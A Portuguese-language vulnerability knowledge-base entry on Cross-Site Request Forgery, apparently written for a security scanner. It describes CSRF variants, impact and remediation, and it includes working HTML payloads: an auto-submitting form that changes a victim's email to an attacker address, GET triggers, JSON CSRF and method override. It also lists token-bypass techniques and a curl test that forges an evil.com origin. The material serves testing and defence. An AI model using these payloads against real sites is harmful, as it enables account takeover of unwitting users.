---
id: csrf
title: "Cross-Site Request Forgery"
module: "csrf"
severity: "HIGH"
cwe_id: "CWE-352"
cwe_title: "Cross-Site Request Forgery (CSRF)"
cvss_vector: "AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
vrt_id: "broken_authentication_and_session_management.csrf"
---

## Summary
Endpoints que alteram estado confiam apenas no cookie de sessão, permitindo que um site malicioso faça o navegador da vítima executar ações autenticadas sem consentimento.

## Description
CSRF explora o envio automático de cookies pelo navegador. Se um endpoint aceita `POST /api/email` ou `POST /account/password` sem token anti-CSRF, sem validação de `Origin`/`Referer` e sem `SameSite`, o atacante cria uma página que dispara a requisição enquanto a vítima está autenticada.

Variantes:
- **CSRF clássico:** formulário auto-submit para endpoint state-changing.
- **Login CSRF:** vítima é logada na conta do atacante e passa a inserir dados nela.
- **JSON CSRF:** endpoint aceita `text/plain` ou formulário e interpreta como JSON.
- **Method override:** `_method=DELETE`/`PUT` em POST.
- **Token bypass:** token não vinculado à sessão, reutilizável, previsível, aceito em branco ou double-submit mal implementado.
- **SameSite bypass:** cookies `SameSite=None` ou navegadores antigos; subdomínio comprometido.
- **CSRF via XSS:** XSS torna o token irrelevante, pois o atacante lê o token.

Endpoints GET que alteram estado são especialmente vulneráveis (`/api/delete?id=1`, `/logout`).

## Impact
- Alteração de e-mail/senha, criando account takeover.
- Transferências, compras, exclusão de dados e alteração de configurações.
- Login CSRF e vazamento de dados para a conta do atacante.
- Ações administrativas em nome de um admin autenticado.
- Impacto HIGH; CRITICAL se account takeover em massa.

## Payloads and Bypasses
```html
<!-- Formulário clássico -->
<form action="https://alvo.com/api/email" method="POST">
  <input type="hidden" name="email" value="atacante@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

```html
<!-- GET state-changing -->
<img src="https://alvo.com/api/delete?id=123">
<iframe src="https://alvo.com/account/logout"></iframe>
```

```html
<!-- JSON CSRF com text/plain -->
<form action="https://alvo.com/api/user" method="POST" enctype="text/plain">
  <input name='{"email":"atacante@evil.com","x":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
```

```html
<!-- Method override -->
<form action="https://alvo.com/api/user/123" method="POST">
  <input type="hidden" name="_method" value="DELETE">
</form>
```

```text
# Token bypass
- Remover o parâmetro csrf_token
- Enviar token vazio
- Reutilizar token de outra sessão/usuário
- Token fixo/previsível
- Token no cookie e no body iguais (double-submit) sem validação de assinatura
- Trocar método POST -> GET/PUT/PATCH
- Enviar Content-Type: application/json sem preflight (text/plain)
- Origin/Referer ausente ou null
- SameSite=None
```

Teste com curl:
```bash
curl -s -X POST https://alvo.com/api/email \
  -H 'Cookie: session=<cookie>' \
  -H 'Origin: https://evil.com' \
  -d 'email=atacante@evil.com'
```

Casos reais e mentalidade de ataque (RWBH): Uber (ações de conta) e Yahoo (webmail) mostram que JSON CSRF, method override e `SameSite=None` ampliam o vetor; o atacante testa endpoints state-changing sem token.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `csrf_token`, `csrf`, `_token`, `authenticity_token`, `X-CSRF-Token`, `_method`, `state`, `nonce`.
- **Paths comuns:** `/api/email`, `/api/password`, `/api/user`, `/account/*`, `/settings`, `/admin/*`, `/logout`, `/transfer`, `/checkout`.
- **Sinais:** endpoints que alteram estado via GET; ausência de token; token não vinculado à sessão; `SameSite=None`; `Origin`/`Referer` não validados.

## Recommendation
1. Exigir token anti-CSRF em todas as requisições state-changing (POST/PUT/PATCH/DELETE), vinculado à sessão e de uso único quando possível.
2. Validar `Origin` e `Referer` contra allowlist, além do token; rejeitar requisições sem `Origin` em contextos sensíveis.
3. Configurar cookies de sessão com `SameSite=Lax` ou `Strict` e `Secure`; usar `None` apenas quando necessário e com token.
4. Nunca alterar estado via GET; usar POST/PUT/PATCH/DELETE e retornar 405 para métodos indevidos.
5. Em APIs JSON, exigir `Content-Type: application/json` e rejeitar `text/plain`/form; usar header customizado (`X-Requested-With`) como defesa adicional, não única.
6. Implementar double-submit com token assinado (HMAC) ou sincronizador server-side; não confiar apenas na igualdade cookie/body.
7. Exigir reautenticação (senha/MFA) para ações críticas (troca de e-mail/senha, transferências).
8. Exemplo Spring Security:
```java
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
    .ignoringRequestMatchers("/webhooks/**"));
```
9. Em Rails, manter `protect_from_forgery with: :exception`; em Django, usar `{% csrf_token %}` e `CsrfViewMiddleware`.
10. Cobrir com testes que enviem requisições sem token, com token de outro usuário e com `Origin` externo.
